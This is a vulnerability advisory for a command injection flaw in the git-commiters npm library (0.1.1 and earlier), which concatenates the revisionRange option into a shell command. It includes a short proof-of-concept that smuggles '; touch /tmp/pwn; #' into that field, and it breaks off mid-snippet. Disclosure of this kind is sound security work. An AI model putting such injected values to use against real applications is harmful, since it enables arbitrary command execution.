title: "`git-comiters` Command Injection vulnerability"
description: "## Background on the vulnerability\n\nThis vulnerability manifests with
  the library's primary exported API: `gitCommiters(options, callback)`\nwhich allows
  specifying options such as `cwd` for current working directory and `revisionRange`
  as a revision pointer, such as `HEAD`.\n\nHowever, the library does not sanitize
  for user input or practice secure process execution API to separate commands from
  their arguments and as such, uncontrolled user input is concatenated into command
  execution.\n\n## Exploit\n\n1. Install `git-commiters@0.1.1` or earlier\n2. Initiaizlie
  a new Git directory with commits in it\n3. Create the following script in that directory:\n\n```js\nvar
  gitCommiters = require(\"git-commiters\");\n\nvar options = {\n  cwd: \"./\",\n
  \ revisionRange: \"HEAD; touch /tmp/pwn; #\",\n};\ngitCommiters(options, function
  (err, result) {\n  if (err) console.log(err);\n  else console.log(result);\n});\n```\n\n3.
  Observe new file created on disk at `/tmp/pwn`\n\nThe git commiters functionality
  works as expected, too, despite the command execution, which further hinders the
  problem as it may not be apparent that a command injection occured on a running
  application.\n\n```sh\n@lirantal ➜ /workspaces/git-commiters.js (master) $ node
